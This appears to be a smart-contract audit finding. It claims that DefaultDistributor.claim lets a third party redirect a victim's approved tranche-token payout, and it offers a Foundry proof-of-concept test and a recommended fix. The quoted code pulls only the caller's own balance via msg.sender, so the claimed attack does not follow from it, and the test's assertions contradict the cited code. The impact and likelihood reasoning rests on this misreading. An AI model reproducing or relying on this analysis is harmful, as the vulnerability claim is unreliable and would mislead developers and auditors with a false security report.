### Title
Approved default-recovery claims can be redirected to an arbitrary recipient - ([File: contracts/DefaultDistributor.sol](contracts/DefaultDistributor.sol))

### Summary
`DefaultDistributor.claim` lets any caller consume a victim's existing tranche-token allowance and choose an arbitrary payout address. Because the function derives the claimable amount from `tranche.balanceOf(msg.sender)`, a front-running or later third-party call can transfer all of the victim's approved tranche tokens into the distributor while sending the underlying recovery payout to the attacker. [1](#0-0) 

### Finding Description
The intended claim flow requires the holder to approve the distributor and then call `claim`, which pulls the holder's entire tranche balance and pays `balance * rate / 1e18` underlying tokens. [1](#0-0) 

However, there is no check that `_to` equals the token owner or that the caller is authorized by that owner. Any EOA can call `claim(attacker)` while a victim has a nonzero balance and sufficient allowance. [1](#0-0) 

This is not prevented by activation or rate accounting: once the owner activates claims, `rate` is fixed from the distributor's underlying balance and total tranche supply. [2](#0-1) 

### Impact Explanation
An attacker can steal the victim's entire default-recovery distribution. The victim loses all approved tranche tokens while the attacker receives the corresponding underlying payout, producing a quantified loss equal to `tranche.balanceOf(victim) * rate / 1e18`. [3](#0-2) 

The attack window is ordinary protocol usage: approval is necessarily granted before `claim`, and unlimited or stale allowance can remain if the holder later receives more tranche tokens. A caller can front-run the intended claim transaction or invoke it later after the victim's balance is replenished. [1](#0-0) 

### Likelihood Explanation
The attack requires only an approved, unclaimed tranche balance; no privileged role is needed. The existing tests demonstrate the vulnerable two-step flow where a user first approves the distributor and then submits `claim(user)` as a separate transaction. [4](#0-3) 

The issue applies during the post-default claim phase when the distributor is active and funded. Because claims consume the holder's entire balance rather than a supplied amount, the attacker captures the full claimable payout rather than only a user-specified portion. [1](#0-0) 

### Recommendation
Remove the `_to` parameter and always pay `msg.sender`, or authenticate the beneficiary. The safest minimal change is:

```solidity
function claim() external {
  require(isActive, '!ACTIVE');
  IERC20 tranche = IERC20(trancheToken);
  uint256 trancheBal = tranche.balanceOf(msg.sender);
  tranche.safeTransferFrom(msg.sender, address(this), trancheBal);
  IERC20(token).safeTransfer(msg.sender, trancheBal * rate / ONE_TRANCHE);
}
```

Alternatively, if paying a different beneficiary is intended, require a signed authorization or a stored beneficiary configured by `msg.sender`; merely allowing callers to supply `_to` is unsafe.

### Proof of Concept
The following Foundry test can be added to `test/foundry/DefaultDistributor.t.sol`. It uses the existing forked `USDC` token and `IdleCDOTranche` setup, activates a funded distributor, has the victim approve it, and shows that an unrelated attacker can redirect the payout.

```solidity
function testClaimCanBeRedirectedByThirdParty() external {
    address victim = address(0xA11CE);
    address attacker = address(0xBAD);
    uint256 trancheAmount = 100 * 1e18;
    uint256 recoveryAmount = 200 * 1e6;

    distributor = new DefaultDistributor(
        address(underlying),
        address(tranche),
        address(this)
    );

    // Test contract is the tranche minter.
    IdleCDOTranche(address(tranche)).mint(victim, trancheAmount);
    deal(address(underlying), address(distributor), recoveryAmount);
    distributor.setIsActive(true);

    // Normal two-step user flow: approve first, claim later.
    vm.prank(victim);
    tranche.approve(address(distributor), trancheAmount);

    // Any third party can consume the approval and choose itself as beneficiary.
    vm.prank(attacker);
    distributor.claim(attacker);

    assertEq(tranche.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(address(distributor)), trancheAmount);
    assertEq(underlying.balanceOf(victim), 0);
    assertEq(underlying.balanceOf(attacker), recoveryAmount);
}
```

### Citations

**File:** contracts/DefaultDistributor.sol (L35-40)
```text
  function claim(address _to) external {
    require(isActive, '!ACTIVE');
    IERC20 tranche = IERC20(trancheToken);
    uint256 trancheBal = tranche.balanceOf(msg.sender);
    tranche.safeTransferFrom(msg.sender, address(this), trancheBal);
    IERC20(token).safeTransfer(_to, trancheBal * rate / ONE_TRANCHE);
```

**File:** contracts/DefaultDistributor.sol (L43-50)
```text
  /// @notice Start claim process and set redemption rate
  /// @param _active claim active flag
  function setIsActive(bool _active) external {
    require(owner() == msg.sender, '!AUTH');
    isActive = _active;
    if (_active) {
      rate = IERC20(token).balanceOf(address(this)) * ONE_TRANCHE / IERC20(trancheToken).totalSupply();
    }
```

**File:** test/foundry/DefaultDistributor.t.sol (L99-107)
```text
    vm.startPrank(user);
    tranche.approve(address(distributor), tranche.balanceOf(user));
    distributor.claim(user);
    assertApproxEqAbs(
      underlying.balanceOf(user) - balU1, 
      amt * _claimable / (amt + amt2),
      1000, // max delta
      'Balance claimed is wrong'
    );
```
